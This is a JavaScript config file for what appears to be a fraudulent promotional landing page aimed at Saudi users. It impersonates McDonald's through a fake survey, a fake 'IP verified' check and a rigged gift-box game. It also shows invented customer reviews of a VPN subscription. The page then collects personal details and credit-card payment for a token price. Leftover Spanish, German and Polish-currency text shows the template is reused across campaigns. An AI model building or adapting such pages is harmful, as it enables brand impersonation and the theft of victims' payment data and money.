const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

const baseUrl = document.querySelector("base[href]")?.href.replace('/index.html', "");
const baseHref = window.location.protocol + "//" + window.location.host;

const landingUrl = baseHref + window.location.pathname;
const imageBase = baseUrl ?? landingUrl;

(function (exp) {
  const countryCode = "sa";
  const lang = "ar-SA";
  const locale = lang;

  const sizes = {
    enabled: false,
    selectText: "Talla: ",
    arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
  };
  // I FILL THIS INFO IN MAIN.JS
  const mainProduct = {
    header: "",
    name: "",
    oldPrice: "",
    newPrice: "",
    selectText: "",
    coupon: "",
    text: `,
Felicidades!<br><br>
Participaste en la promoción de Stanley: tienes la oportunidad de comprar el termo con molde para hielo STANLEY QUENCHER H2.0 por solo <b>$37</b>!
`,
  };

  const notifications = [
    // {
    // 	user: "Manuel S*****",
    // 	location: "Barcelona, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 15 segundos",
    // },
    // {
    // 	user: "Carlos B******",
    // 	location: "Madrid, España",
    // 	action: "¡Acabo de recibir la joya por 1,95 euros!",
    // 	timeago: "hace 25 segundos",
    // },
  ];

  const reviewsArr = [
    {
      name: "محمد",
      time: "قبل يوم واحد",
      header: "إنه أمر لا يصدق!",
      product: "26468782",
      review:
        "باعتباري أحد عملاء VPN Proxy Master لسنوات عديدة، فقد فوجئت جدًا بالعثور على VPN المفضل لدي بسعر معقول جدًا 😊",
    },
    {
      name: "علي",
      time: "قبل يومين",
      header: "رائع! لا أجد الكلمات.",
      product: "26468789",
      review:
        "قررت تجربة VPN Proxy Master للمرة الأولى وهي الآن خدمة VPN المفضلة لدي، شكرًا لك!",
    },
    {
      name: "فاطمة",
      time: "قبل يومين",
      header: "رائع ببساطة.",
      product: "26468785",
      review: "خدمة VPN Proxy الرئيسية ممتازة، أوصي بها للجميع، حماية موثوقة.",
    },
    {
      name: "عائشة",
      time: "قبل أربعة أيام",
      header: "أعجبني",
      review:
        "لأكون صادقًا، أنا قلق للغاية بشأن أماني، VPN Proxy Master هو بالضبط ما أحتاجه.",
    },
    {
      name: "يوسف",
      time: "قبل سبعة أيام",
      header: "واو، أنا أحب هذا المنتج تماماً!",
      product: "26468784",
      review:
        "في البداية اعتقدت أن VPN غير ضرورية، لكن لحسن الحظ شاركت في حملة VPN Proxy Master ولم أندم على ذلك. شكرًا لك!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "MEINUNGEN UND BEWERTUNGEN",
    percent: "99%",
    rec: "تعليقات حول هذا العرض الترويجي",
  };

  const questions = {
    _of: "سؤال {1} من {2}: ",
    arr: [
      {
        q: "هل سبق لك أن طلبت منتجات من ماكدونالدز؟",
        a: [
          "نعم، أطلب بشكل متكرر",
          "نعم، أطلب نادراً",
          "لم أطلب من قبل",
        ],
      },
      {
        q: "هل يجب على ماكدونالدز الاستمرار في مثل هذه الحملات الإعلانية؟",
        a: ["نعم، بالطبع!", "نعم، لكن غيروا القائمة الترويجية", "لا"],
      },
      {
        q: "هل ستوصي بمنتجاتنا لأصدقائك؟",
        a: ["نعم", "لا"],
      },
    ],
  };

  const check = {
    title: "سيتم مراجعة إجابتك",
    arr: [
      "لقد أجبت على السؤال 3 من 3",
      "عنوان IP الخاص بك لا يُظهر طلبات سابقة",
      "تم التحقق من إجابتك",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "شكراً لمشاركتك في الاستبيان!",
        button: "حاول حظك",
        text: `
<center>
    للحصول على قائمة ماكدونالدز بسعر ترويجي، يجب عليك اختيار صندوق الهدايا الصحيح.
          <br><br>
       لديك 3 محاولات، حظاً موفقاً!
        </center>
      `,
      },
    },
    first: {
      texts: {
        header: "أوه، لا..",
        button: "حاول مرة أخرى",
        text: `
        <center>
       للأسف، هذه الهدية فارغة! لديك محاولتان متبقيتان - حظاً موفقاً!
        </center>
      `,
      },
    },
    win: {
      texts: {
        header: "اشتراك VPN Proxy Master لمدة 12 شهرًا لستة أجهزة",
        button: "احصل على القسيمة",
        text: `
<center>
  <p style="color: #ffffff">
  </p>
  <br>
  اضغط على "احصل على القسيمة"، املأ النموذج وادفع الطلب.
   <br><br>
  استلم رسالة نصية تحتوي على القسيمة وتعليمات تفعيلها.
  <br><br>
  يمكن تفعيل القسيمة في أي وقت، ولا يتطلب الأمر دفعاً إضافياً.
</center>
      `,
      },
    },
  };

  const cartSteps = {
    personal: {
      title: "المعلومات الشخصية",
      fields: {
        name: {
          enabled: true,
          field: "الاسم",
        },
        family: {
          enabled: true,
          field: "اللقب",
        },
        phone: {
          enabled: true,
          field: "رقم الهاتف",
        },
        email: {
          enabled: true,
          field: "البريد الإلكتروني",
        },
      },
    },
    delivery: {
      title: "التوصيل",
      fields: {
        city: {
          enabled: true,
          field: "المدينة",
        },
        address: {
          enabled: true,
          field: "عنوان التوصيل",
        },
        zip: {
          enabled: true,
          field: "الرمز البريدي",
        },
      },
    },
    payment: {
      title: "طرق الدفع",
      creditCard: "الدفع عبر الإنترنت بواسطة بطاقة الائتمان",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "تفاصيل الطلب",
      oldPrice: "299.00 PLN",
      newPrice: "SR.7.65",
      size: "Talla",
      subTotal: {
        title: "قيمة الطلب",
        amount: "SR.7.65",
      },
      delivery: {
        title: "التوصيل",
        amount: "SR.0.00",
      },
      total: {
        title: "الإجمالي",
        amount: "SR.7.65",
      },
      checkoutButton: "ادفع طلبك",
    },
  };

  const products = [
    {
      id: "26468784",
      name: "اشتراك VPN Proxy Master لمدة 12 شهرًا لستة أجهزة",
      miniImg: "../src/img/slide3.png",

      images: ["../src/img/slide3.png"],
    },
    {
      id: "26468782",
      name: "اشتراك VPN Proxy Master لمدة 12 شهرًا لستة أجهزة",
      miniImg: "../src/img/slide1.png",

      images: ["../src/img/slide1.png"],
    },
    {
      id: "26468783",
      name: "اشتراك VPN Proxy Master لمدة 12 شهرًا لستة أجهزة",
      miniImg: "../src/img/slide2.png",

      images: ["../src/img/slide2.png"],
    },

  ];

  const footer = {
    cr: "© 2024 شاهد. جميع الحقوق محفوظة.",
  };

  const pathImgBox = {
    lid: "../src/img/box-lid.png",
    lidIOs: "../src/img/box-lid-ios.png",
    inner: "../src/img/box-inner.png",
    innerGift: "../src/img/box-inner-gift.png",
    box: "../src/img/box.png",
    boxModal: "../src/img/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);

window.addEventListener("load", () => {
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  localStorage.setItem("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = localStorage.getItem("__selected_product");


  ///
  if (ind == null) {
    ind = products[0].id;
    lsSelectProduct(ind);
  }
  const product = products.find((pr) => pr.id === ind);
  const mainProduct = window.__config.mainProduct;

  const localImageUrl = product.images[0].replace("./", "/");
  const imageUrl = imageBase + localImageUrl;

  document.querySelector("input[name='product_name']").value =
    mainProduct.name + ": " + product.name;
  document.querySelector("input[name='product_image']").value = imageUrl;

  return product;
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => localStorage.setItem("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = localStorage.getItem("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => localStorage.setItem("__step", val);
const lsGetStep = () => {
  const step = localStorage.getItem("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
  document
    .querySelector(".checkout_header")
    .setAttribute("style", "display: flex");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};


document.querySelector("form").addEventListener("submit", (e) => {
  document.querySelector("#submitButton").setAttribute("disabled", "true");
  const spinner = document.createElement("div");
  spinner.classList.add("spinner__", "submitButton");
  document.querySelector("#submitButton").appendChild(spinner);
});